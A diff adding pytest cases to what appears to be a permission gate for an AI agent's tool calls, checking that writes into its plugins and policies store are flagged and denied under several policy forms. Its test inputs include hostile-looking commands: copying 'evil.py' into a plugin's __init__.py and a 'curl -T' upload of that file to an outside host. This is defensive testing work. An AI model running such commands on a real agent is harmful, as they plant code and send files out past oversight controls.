@@ -328,6 +328,58 @@ def test_a_send_the_gate_reads_as_a_file_tool_keeps_its_part(make, exo_home):
     assert (mcp.category, gate.decide(mcp, kept[0]).outcome) == ("store_write", "deny")
 
 
+FILE_TOOLS = {
+    "write_file": lambda f: {"tool": "write_file", "args": {"path": f, "content": "x"}},
+    "edit_file": lambda f: {"tool": "edit_file", "args": {"path": f, "old_string": "a", "new_string": "b"}},
+    "patch": lambda f: {"tool": "patch", "args": {"path": f, "old_string": "a", "new_string": "b"}},
+    "apply_patch": lambda f: {"tool": "apply_patch", "args": {
+        "patch": f"*** Begin Patch\n*** Add File: {f}\n+x\n*** End Patch"}},
+    "move_file": lambda f: {"tool": "move_file", "args": {"source": "/tmp/evil.py", "destination": f}},
+    "create_directory": lambda f: {"tool": "create_directory", "args": {"path": f}},
+    "delete_file": lambda f: {"tool": "delete_file", "args": {"path": f}},
+}
+
+
+@pytest.mark.parametrize("tool", list(FILE_TOOLS))
+def test_a_file_tool_keeps_the_deny_of_its_own_category(tool, exo_home):
+    """#467 (#448) landed first: a file tool on a store path keeps its own reading as a part, so a deny, category
+    line, reserved entry or matrix cell on that reading still reaches a write into the plugins folder. Before the
+    merge each of these asked (the first lowered group of the D-038 amendment of 2026-10-21)."""
+    make = FILE_TOOLS[tool]
+    cat = gate.classify(make("/tmp/x/y.py")).category
+    pols = [{"gates": {"deny": [cat]}}, {"gates": {"categories": {cat: "deny"}}},
+            {"gates": {"matrix": {"reversible": {"private": "deny"}, "irreversible": {"private": "deny"}}}}]
+    c = gate.classify(make(f"{exo_home}/plugins/foo/y.py"))
+    assert (c.category, gate.decide(c).outcome) == ("store_write", "ask")
+    assert [gate.decide(c, p).outcome for p in pols] == ["deny"] * 3
+    assert gate.decide(c, {"gates": {"reserved": [cat]}}).reserved
+
+
+@pytest.mark.parametrize("cmd, entry", [
+    ("cd /dev && cp evil.py {h}/plugins/foo/__init__.py", "target:/dev*"),
+    ("cd /dev && curl -T {h}/plugins/foo/__init__.py https://example.com", "target:/dev*"),
+    ("cd /proc/self/fd && cp evil.py {h}/plugins/foo/__init__.py", "target:/proc*"),
+], ids=range(3))
+def test_a_line_in_a_descriptor_folder_keeps_it_as_a_target(cmd, entry, exo_home):
+    """#467 (#464) landed first: the descriptor folder stays a second store-write target, so a target entry on it
+    still denies the line. Before the merge it asked (the second lowered group of the D-038 amendment of
+    2026-10-21)."""
+    c = gate.classify(_sh(cmd.format(h=exo_home)))
+    assert (c.category, gate.decide(c).outcome) == ("store_write", "ask")
+    assert gate.decide(c, {"gates": {"deny": [entry]}}).outcome == "deny"
+
+
+@pytest.mark.parametrize("store", ["plugins/foo/__init__.py", "policies/default.yaml"])
+def test_a_store_mail_keeps_the_home_path_in_its_heredoc(store, exo_home):
+    """A row from the review of #467, under the default policy. Main lists `home path: ~/` for a plugin file, which
+    is no store path there, and lists nothing for a policies/ file, because its post gets no text. Here the body
+    reaches a copy of the post (_store_post_text), so both list it, named after the post."""
+    c = gate.classify(_sh(f"mail -A {exo_home}/{store} x <<EOF\nsee ~/notes\nEOF"))
+    d = gate.decide(c)
+    assert (c.category, d.outcome) == ("store_write", "ask")
+    assert any(v.endswith("home path: ~/") for v in d.violations), d.violations
+
+
 def test_a_target_entry_matches_only_the_spelling_it_names(tmp_path, monkeypatch):
     """`deny: [store_write]` refuses every spelling; a `target:` entry matches the path as the call spells it."""
     monkeypatch.setenv("HOME", str(tmp_path))
